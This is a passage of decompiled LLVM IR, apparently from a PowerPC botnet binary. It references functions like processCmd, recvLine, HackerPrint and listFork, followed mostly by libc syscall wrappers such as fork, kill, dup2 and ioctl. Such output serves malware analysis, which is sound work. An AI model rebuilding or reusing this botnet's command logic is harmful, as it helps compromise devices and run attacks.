  %stack_var_-5308.1.lcssa = phi i32 [ 1, %dec_label_pc_1000d40c ], [ %stack_var_-5308.0, %dec_label_pc_1000d500 ]
  store i32 268490036, i32* @lr, align 4
  %v3_1000d530 = call i32 @processCmd(i32 %stack_var_-5308.1.lcssa, i32* %v2_1000d530)
  %tmp95 = icmp slt i32 %stack_var_-5308.1.lcssa, 2
  br i1 %tmp95, label %dec_label_pc_1000d590, label %dec_label_pc_1000d554.lr.ph

dec_label_pc_1000d554.lr.ph:                      ; preds = %dec_label_pc_1000d524
  store i32 1, i32* %stack_var_-5320, align 4
  br label %dec_label_pc_1000d554

dec_label_pc_1000d554:                            ; preds = %dec_label_pc_1000d554.lr.ph, %dec_label_pc_1000d554
  %v3_1000d554 = phi i32 [ 1, %dec_label_pc_1000d554.lr.ph ], [ %v1_1000d578, %dec_label_pc_1000d554 ]
  %v1_1000d558 = mul i32 %v3_1000d554, 4
  %v1_1000d564 = add i32 %v1_1000d558, %v2_1000d560
  %v1_1000d568 = inttoptr i32 %v1_1000d564 to i32*
  %v2_1000d568 = load i32, i32* %v1_1000d568, align 4
  store i32 268490100, i32* @lr, align 4
  %v1_1000d570 = call i32 @free(i32 %v2_1000d568)
  %v3_1000d574 = load i32, i32* %stack_var_-5320, align 4
  %v1_1000d578 = add i32 %v3_1000d574, 1
  store i32 %v1_1000d578, i32* %stack_var_-5320, align 4
  %v2_1000d588 = icmp slt i32 %v1_1000d578, %stack_var_-5308.1.lcssa
  br i1 %v2_1000d588, label %dec_label_pc_1000d554, label %dec_label_pc_1000d590

dec_label_pc_1000d590:                            ; preds = %dec_label_pc_1000d554, %dec_label_pc_1000d344, %dec_label_pc_1000d148, %dec_label_pc_1000d524, %dec_label_pc_1000d1a8, %dec_label_pc_1000d0fc, %dec_label_pc_1000cd84
  %v3_1000d594 = load i32, i32* @global_var_1002c8e0.30, align 4
  %v5_1000d5a8 = call i32 @recvLine(i32 %v3_1000d594, i8* %v4_1000d5a8, i32 4096, i32 %v2_1000d598)
  %v4_1000d5bc = icmp eq i32 %v5_1000d5a8, -1
  br i1 %v4_1000d5bc, label %dec_label_pc_1000cd68, label %dec_label_pc_1000d04c

; uselistorder directives
  uselistorder i32 %v5_1000d5a8, { 1, 0 }
  uselistorder i32 %v1_1000d578, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5308.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000d50c, { 1, 0 }
  uselistorder i8* %stack_var_-5312.045, { 1, 0 }
  uselistorder i32 %stack_var_-5308.143, { 1, 3, 0, 2 }
  uselistorder i8* %v5_1000d318, { 1, 0 }
  uselistorder i32 %v1_1000d314, { 1, 0 }
  uselistorder i8* %storemerge837, { 1, 0 }
  uselistorder i32 %v4_1000d31c38, { 1, 0 }
  uselistorder i32 %v1_1000d2d4, { 1, 0 }
  uselistorder i8* %v5_1000d1f4, { 5, 6, 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_1000d1f0, { 0, 2, 1, 6, 4, 5, 3 }
  uselistorder i32 %v1_1000d168, { 1, 0 }
  uselistorder i32 %v2_1000d078, { 1, 0 }
  uselistorder i32 %storemerge15, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge19, { 1, 0, 2 }
  uselistorder i32 %v1_1000cf80, { 1, 0 }
  uselistorder i32 %v1_1000cf64, { 1, 0 }
  uselistorder i32 %v3_1000cf18, { 1, 0 }
  uselistorder i32 %v1_1000ce30, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000d354, { 3, 1, 2, 4, 0, 5 }
  uselistorder i8* %v4_1000d5a8, { 1, 0 }
  uselistorder i32 %v2_1000d598, { 3, 1, 0, 4, 5, 6, 7, 8, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-5320, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-5252, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 4, 3, 2, 1, 0, 6, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1001ac68.1027 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_1002c8e8.38, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @HackerPrint, { 15, 14, 7, 6, 5, 4, 3, 2, 1, 13, 12, 11, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 0, 2, 1 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 24, 23, 22, 0, 21, 20, 1, 19, 18, 17, 16, 2, 15, 14, 13, 12, 11, 10, 9, 8, 7, 3, 6, 5, 4 }
  uselistorder i32 (i32*, i32)* @__GI_inet_ntoa, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_1000d590, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_1000d554, { 1, 0 }
  uselistorder label %dec_label_pc_1000d500, { 1, 0 }
  uselistorder label %dec_label_pc_1000d43c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d40c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d2c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d2b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d224, { 1, 0 }
  uselistorder label %dec_label_pc_1000d180, { 1, 0 }
  uselistorder label %dec_label_pc_1000d148, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d040, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cd48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cbf0, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000d5d8 = icmp eq i32 %arg2, -2143521772
  %v2_1000d5ec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d5ec, i32* %stack_var_-32, align 4
  br i1 %v4_1000d5d8, label %dec_label_pc_1000d64c, label %dec_label_pc_1000d60c

dec_label_pc_1000d60c:                            ; preds = %entry
  %v3_1000d60c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000d60c, label %dec_label_pc_1000d624, label %dec_label_pc_1000d614

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d60c
  %v3_1000d618 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000d618, label %dec_label_pc_1000d640, label %dec_label_pc_1000d66c

dec_label_pc_1000d624:                            ; preds = %dec_label_pc_1000d60c
  %v1_1000d624 = xor i32 %arg2, -2143551488
  %v3_1000d628 = icmp eq i32 %v1_1000d624, 29717
  br i1 %v3_1000d628, label %dec_label_pc_1000d65c, label %dec_label_pc_1000d630

dec_label_pc_1000d630:                            ; preds = %dec_label_pc_1000d624
  %v3_1000d634 = icmp eq i32 %v1_1000d624, 29718
  br i1 %v3_1000d634, label %dec_label_pc_1000d664, label %dec_label_pc_1000d66c

dec_label_pc_1000d640:                            ; preds = %dec_label_pc_1000d614
  store i32 ptrtoint (i32* @global_var_1000d648.1028 to i32), i32* @lr, align 4
  %v1_1000d644 = inttoptr i32 %arg3 to i32*
  %v2_1000d644 = call i32 @__GI_tcgetattr(i32* %v1_1000d644)
  br label %dec_label_pc_1000d654

dec_label_pc_1000d64c:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000d650

dec_label_pc_1000d650:                            ; preds = %dec_label_pc_1000d664, %dec_label_pc_1000d65c, %dec_label_pc_1000d64c
  store i32 268490324, i32* @lr, align 4
  %v0_1000d650 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000d654

dec_label_pc_1000d654:                            ; preds = %dec_label_pc_1000d640, %dec_label_pc_1000d650
  %storemerge = phi i32 [ %v0_1000d650, %dec_label_pc_1000d650 ], [ %v2_1000d644, %dec_label_pc_1000d640 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d698

dec_label_pc_1000d65c:                            ; preds = %dec_label_pc_1000d624
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000d650

dec_label_pc_1000d664:                            ; preds = %dec_label_pc_1000d630
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000d650

dec_label_pc_1000d66c:                            ; preds = %dec_label_pc_1000d630, %dec_label_pc_1000d614
  %v0_1000d67c = call i32 @__asm_mfcr()
  %v1_1000d680 = and i32 %v0_1000d67c, 268435456
  %v3_1000d680 = icmp eq i32 %v1_1000d680, 0
  store i32 %v0_1000d67c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d680, label %dec_label_pc_1000d698, label %dec_label_pc_1000d68c

dec_label_pc_1000d68c:                            ; preds = %dec_label_pc_1000d66c
  %v0_1000d68c = call i32 @__errno_location()
  %v0_1000d690 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d690 = inttoptr i32 %v0_1000d68c to i32*
  store i32 %v0_1000d690, i32* %v2_1000d690, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d698

dec_label_pc_1000d698:                            ; preds = %dec_label_pc_1000d66c, %dec_label_pc_1000d654, %dec_label_pc_1000d68c
  %v0_1000d69c = phi i32 [ %v0_1000d67c, %dec_label_pc_1000d66c ], [ %storemerge, %dec_label_pc_1000d654 ], [ -1, %dec_label_pc_1000d68c ]
  ret i32 %v0_1000d69c

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000d698, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d654, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000d6b8 = load i32, i32* @lr, align 4
  %v1_1000d6b8 = load i1, i1* @cr0_so, align 1
  %v2_1000d6b8 = xor i1 %v1_1000d6b8, true
  call void @__pseudo_cond_branch(i1 %v2_1000d6b8, i32 %v0_1000d6b8)
  %v0_1000d6bc = call i32 @__syscall_error()
  ret i32 %v0_1000d6bc
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000d6d4 = add i32 %arg2, -12
  %v2_1000d6d8 = icmp ugt i32 %v1_1000d6d4, 2
  %v2_1000d6e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d6e0, i32* %stack_var_-32, align 4
  br i1 %v2_1000d6d8, label %dec_label_pc_1000d70c, label %dec_label_pc_1000d6fc

dec_label_pc_1000d6fc:                            ; preds = %entry
  store i32 268490500, i32* @lr, align 4
  %v2_1000d700 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000d700, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d72c

dec_label_pc_1000d70c:                            ; preds = %entry
  %v0_1000d710 = call i32 @__asm_mfcr()
  %v1_1000d714 = and i32 %v0_1000d710, 268435456
  %v3_1000d714 = icmp eq i32 %v1_1000d714, 0
  store i32 %v0_1000d710, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d714, label %dec_label_pc_1000d72c, label %dec_label_pc_1000d720

dec_label_pc_1000d720:                            ; preds = %dec_label_pc_1000d70c
  %v0_1000d720 = call i32 @__errno_location()
  %v0_1000d724 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d724 = inttoptr i32 %v0_1000d720 to i32*
  store i32 %v0_1000d724, i32* %v2_1000d724, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d72c

dec_label_pc_1000d72c:                            ; preds = %dec_label_pc_1000d70c, %dec_label_pc_1000d6fc, %dec_label_pc_1000d720
  %v0_1000d730 = phi i32 [ %v0_1000d710, %dec_label_pc_1000d70c ], [ %v2_1000d700, %dec_label_pc_1000d6fc ], [ -1, %dec_label_pc_1000d720 ]
  ret i32 %v0_1000d730

; uselistorder directives
  uselistorder label %dec_label_pc_1000d72c, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000d75c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000d75c, i32* %stack_var_-32, align 4
  %v0_1000d778 = call i32 @__asm_mfcr()
  %v1_1000d77c = and i32 %v0_1000d778, 268435456
  %v3_1000d77c = icmp eq i32 %v1_1000d77c, 0
  store i32 %v0_1000d778, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d77c, label %dec_label_pc_1000d794, label %dec_label_pc_1000d788

dec_label_pc_1000d788:                            ; preds = %entry
  %v0_1000d788 = call i32 @__errno_location()
  %v0_1000d78c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d78c = inttoptr i32 %v0_1000d788 to i32*
  store i32 %v0_1000d78c, i32* %v2_1000d78c, align 4
  br label %dec_label_pc_1000d794

dec_label_pc_1000d794:                            ; preds = %entry, %dec_label_pc_1000d788
  %v0_1000d7a4 = phi i32 [ %v0_1000d778, %entry ], [ -1, %dec_label_pc_1000d788 ]
  ret i32 %v0_1000d7a4

; uselistorder directives
  uselistorder label %dec_label_pc_1000d794, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000d7bc

dec_label_pc_1000d7bc:                            ; preds = %dec_label_pc_1000d7bc.backedge, %entry
  %v0_1000d7c8 = call i32 @__asm_mfcr()
  %v1_1000d7cc = and i32 %v0_1000d7c8, 268435456
  %v3_1000d7cc = icmp eq i32 %v1_1000d7cc, 0
  store i32 %v0_1000d7c8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d7cc, label %dec_label_pc_1000d7bc.backedge, label %dec_label_pc_1000d7d8

dec_label_pc_1000d7d8:                            ; preds = %dec_label_pc_1000d7bc
  %v0_1000d7d8 = call i32 @__errno_location()
  %v0_1000d7dc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d7dc = inttoptr i32 %v0_1000d7d8 to i32*
  store i32 %v0_1000d7dc, i32* %v2_1000d7dc, align 4
  br label %dec_label_pc_1000d7bc.backedge

dec_label_pc_1000d7bc.backedge:                   ; preds = %dec_label_pc_1000d7d8, %dec_label_pc_1000d7bc
  br label %dec_label_pc_1000d7bc
}

define i32 @access(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d7fc = call i32 @__asm_mfcr()
  %v1_1000d800 = and i32 %v0_1000d7fc, 268435456
  %v3_1000d800 = icmp eq i32 %v1_1000d800, 0
  store i32 %v0_1000d7fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d800, label %dec_label_pc_1000d818, label %dec_label_pc_1000d80c

dec_label_pc_1000d80c:                            ; preds = %entry
  %v0_1000d80c = call i32 @__errno_location()
  %v0_1000d810 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d810 = inttoptr i32 %v0_1000d80c to i32*
  store i32 %v0_1000d810, i32* %v2_1000d810, align 4
  br label %dec_label_pc_1000d818

dec_label_pc_1000d818:                            ; preds = %entry, %dec_label_pc_1000d80c
  %v0_1000d828 = phi i32 [ %v0_1000d7fc, %entry ], [ -1, %dec_label_pc_1000d80c ]
  ret i32 %v0_1000d828

; uselistorder directives
  uselistorder label %dec_label_pc_1000d818, { 1, 0 }
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d844 = call i32 @__asm_mfcr()
  %v1_1000d848 = and i32 %v0_1000d844, 268435456
  %v3_1000d848 = icmp eq i32 %v1_1000d848, 0
  store i32 %v0_1000d844, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d848, label %dec_label_pc_1000d860, label %dec_label_pc_1000d854

dec_label_pc_1000d854:                            ; preds = %entry
  %v0_1000d854 = call i32 @__errno_location()
  %v0_1000d858 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d858 = inttoptr i32 %v0_1000d854 to i32*
  store i32 %v0_1000d858, i32* %v2_1000d858, align 4
  br label %dec_label_pc_1000d860

dec_label_pc_1000d860:                            ; preds = %entry, %dec_label_pc_1000d854
  %v0_1000d870 = phi i32 [ %v0_1000d844, %entry ], [ -1, %dec_label_pc_1000d854 ]
  ret i32 %v0_1000d870

; uselistorder directives
  uselistorder label %dec_label_pc_1000d860, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d88c = call i32 @__asm_mfcr()
  %v1_1000d890 = and i32 %v0_1000d88c, 268435456
  %v3_1000d890 = icmp eq i32 %v1_1000d890, 0
  store i32 %v0_1000d88c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d890, label %dec_label_pc_1000d8a8, label %dec_label_pc_1000d89c

dec_label_pc_1000d89c:                            ; preds = %entry
  %v0_1000d89c = call i32 @__errno_location()
  %v0_1000d8a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d8a0 = inttoptr i32 %v0_1000d89c to i32*
  store i32 %v0_1000d8a0, i32* %v2_1000d8a0, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d8a8:                            ; preds = %entry, %dec_label_pc_1000d89c
  %v0_1000d8b8 = phi i32 [ %v0_1000d88c, %entry ], [ -1, %dec_label_pc_1000d89c ]
  ret i32 %v0_1000d8b8

; uselistorder directives
  uselistorder label %dec_label_pc_1000d8a8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d8d4 = call i32 @__asm_mfcr()
  %v1_1000d8d8 = and i32 %v0_1000d8d4, 268435456
  %v3_1000d8d8 = icmp eq i32 %v1_1000d8d8, 0
  store i32 %v0_1000d8d4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d8d8, label %dec_label_pc_1000d8f0, label %dec_label_pc_1000d8e4

dec_label_pc_1000d8e4:                            ; preds = %entry
  %v0_1000d8e4 = call i32 @__errno_location()
  %v0_1000d8e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d8e8 = inttoptr i32 %v0_1000d8e4 to i32*
  store i32 %v0_1000d8e8, i32* %v2_1000d8e8, align 4
  br label %dec_label_pc_1000d8f0

dec_label_pc_1000d8f0:                            ; preds = %entry, %dec_label_pc_1000d8e4
  %v0_1000d900 = phi i32 [ %v0_1000d8d4, %entry ], [ -1, %dec_label_pc_1000d8e4 ]
  ret i32 %v0_1000d900

; uselistorder directives
  uselistorder label %dec_label_pc_1000d8f0, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d91c = call i32 @__asm_mfcr()
  %v1_1000d920 = and i32 %v0_1000d91c, 268435456
  %v3_1000d920 = icmp eq i32 %v1_1000d920, 0
  store i32 %v0_1000d91c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d920, label %dec_label_pc_1000d938, label %dec_label_pc_1000d92c

dec_label_pc_1000d92c:                            ; preds = %entry
  %v0_1000d92c = call i32 @__errno_location()
  %v0_1000d930 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d930 = inttoptr i32 %v0_1000d92c to i32*
  store i32 %v0_1000d930, i32* %v2_1000d930, align 4
  br label %dec_label_pc_1000d938

dec_label_pc_1000d938:                            ; preds = %entry, %dec_label_pc_1000d92c
  %v0_1000d948 = phi i32 [ %v0_1000d91c, %entry ], [ -1, %dec_label_pc_1000d92c ]
  ret i32 %v0_1000d948

; uselistorder directives
  uselistorder label %dec_label_pc_1000d938, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000d958 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268491108, i32* @lr, align 4
  %v2_1000d960 = call i32 @getrlimit(i32 7, i32 %v2_1000d958)
  %v1_1000d964 = icmp slt i32 %v2_1000d960, 0
  br i1 %v1_1000d964, label %dec_label_pc_1000d974, label %dec_label_pc_1000d970

dec_label_pc_1000d970:                            ; preds = %entry
  %v3_1000d970 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000d974

dec_label_pc_1000d974:                            ; preds = %entry, %dec_label_pc_1000d970
  %v0_1000d980 = phi i32 [ 256, %entry ], [ %v3_1000d970, %dec_label_pc_1000d970 ]
  ret i32 %v0_1000d980

; uselistorder directives
  uselistorder label %dec_label_pc_1000d974, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d99c = call i32 @__asm_mfcr()
  %v1_1000d9a0 = and i32 %v0_1000d99c, 268435456
  %v3_1000d9a0 = icmp eq i32 %v1_1000d9a0, 0
  store i32 %v0_1000d99c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d9a0, label %dec_label_pc_1000d9b8, label %dec_label_pc_1000d9ac

dec_label_pc_1000d9ac:                            ; preds = %entry
  %v0_1000d9ac = call i32 @__errno_location()
  %v0_1000d9b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d9b0 = inttoptr i32 %v0_1000d9ac to i32*
  store i32 %v0_1000d9b0, i32* %v2_1000d9b0, align 4
  br label %dec_label_pc_1000d9b8

dec_label_pc_1000d9b8:                            ; preds = %entry, %dec_label_pc_1000d9ac
  %v0_1000d9c8 = phi i32 [ %v0_1000d99c, %entry ], [ -1, %dec_label_pc_1000d9ac ]
  ret i32 %v0_1000d9c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000d9b8, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d9e4 = call i32 @__asm_mfcr()
  %v1_1000d9e8 = and i32 %v0_1000d9e4, 268435456
  %v3_1000d9e8 = icmp eq i32 %v1_1000d9e8, 0
  store i32 %v0_1000d9e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d9e8, label %dec_label_pc_1000da00, label %dec_label_pc_1000d9f4

dec_label_pc_1000d9f4:                            ; preds = %entry
  %v0_1000d9f4 = call i32 @__errno_location()
  %v0_1000d9f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d9f8 = inttoptr i32 %v0_1000d9f4 to i32*
  store i32 %v0_1000d9f8, i32* %v2_1000d9f8, align 4
  br label %dec_label_pc_1000da00

dec_label_pc_1000da00:                            ; preds = %entry, %dec_label_pc_1000d9f4
  %v0_1000da10 = phi i32 [ %v0_1000d9e4, %entry ], [ -1, %dec_label_pc_1000d9f4 ]
  ret i32 %v0_1000da10

; uselistorder directives
  uselistorder label %dec_label_pc_1000da00, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000da2c = call i32 @__asm_mfcr()
  %v1_1000da30 = and i32 %v0_1000da2c, 268435456
  %v3_1000da30 = icmp eq i32 %v1_1000da30, 0
  store i32 %v0_1000da2c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000da30, label %dec_label_pc_1000da48, label %dec_label_pc_1000da3c

dec_label_pc_1000da3c:                            ; preds = %entry
  %v0_1000da3c = call i32 @__errno_location()
  %v0_1000da40 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000da40 = inttoptr i32 %v0_1000da3c to i32*
  store i32 %v0_1000da40, i32* %v2_1000da40, align 4
  br label %dec_label_pc_1000da48

dec_label_pc_1000da48:                            ; preds = %entry, %dec_label_pc_1000da3c
  %v0_1000da58 = phi i32 [ %v0_1000da2c, %entry ], [ -1, %dec_label_pc_1000da3c ]
  ret i32 %v0_1000da58

; uselistorder directives
  uselistorder label %dec_label_pc_1000da48, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000da74 = call i32 @__asm_mfcr()
  %v1_1000da78 = and i32 %v0_1000da74, 268435456
  %v3_1000da78 = icmp eq i32 %v1_1000da78, 0
  store i32 %v0_1000da74, i32* %r31.global-to-local, align 4
  br i1 %v3_1000da78, label %dec_label_pc_1000da90, label %dec_label_pc_1000da84

dec_label_pc_1000da84:                            ; preds = %entry
  %v0_1000da84 = call i32 @__errno_location()
  %v0_1000da88 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000da88 = inttoptr i32 %v0_1000da84 to i32*
  store i32 %v0_1000da88, i32* %v2_1000da88, align 4
  br label %dec_label_pc_1000da90

dec_label_pc_1000da90:                            ; preds = %entry, %dec_label_pc_1000da84
  %v0_1000daa0 = phi i32 [ %v0_1000da74, %entry ], [ -1, %dec_label_pc_1000da84 ]
  ret i32 %v0_1000daa0

; uselistorder directives
  uselistorder label %dec_label_pc_1000da90, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000dab8 = and i32 %arg2, 64
  %v3_1000dab8 = icmp eq i32 %v1_1000dab8, 0
  br i1 %v3_1000dab8, label %dec_label_pc_1000dae4, label %dec_label_pc_1000dac8

dec_label_pc_1000dac8:                            ; preds = %entry
  %v2_1000dad0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000dad0, i32* %stack_var_-32, align 4
  %v0_1000dae0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000dae4

dec_label_pc_1000dae4:                            ; preds = %entry, %dec_label_pc_1000dac8
  %v0_1000dae4 = phi i32 [ 0, %entry ], [ %v0_1000dae0, %dec_label_pc_1000dac8 ]
  store i32 %v0_1000dae4, i32* @r5, align 4
  %v0_1000daec = call i32 @__asm_mfcr()
  %v1_1000daf0 = and i32 %v0_1000daec, 268435456
  %v3_1000daf0 = icmp eq i32 %v1_1000daf0, 0
  store i32 %v0_1000daec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000daf0, label %dec_label_pc_1000db08, label %dec_label_pc_1000dafc

dec_label_pc_1000dafc:                            ; preds = %dec_label_pc_1000dae4
  %v0_1000dafc = call i32 @__errno_location()
  %v0_1000db00 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000db00 = inttoptr i32 %v0_1000dafc to i32*
  store i32 %v0_1000db00, i32* %v2_1000db00, align 4
  br label %dec_label_pc_1000db08

dec_label_pc_1000db08:                            ; preds = %dec_label_pc_1000dae4, %dec_label_pc_1000dafc
  %v0_1000db18 = phi i32 [ %v0_1000daec, %dec_label_pc_1000dae4 ], [ -1, %dec_label_pc_1000dafc ]
  ret i32 %v0_1000db18

; uselistorder directives
  uselistorder label %dec_label_pc_1000db08, { 1, 0 }
  uselistorder label %dec_label_pc_1000dae4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
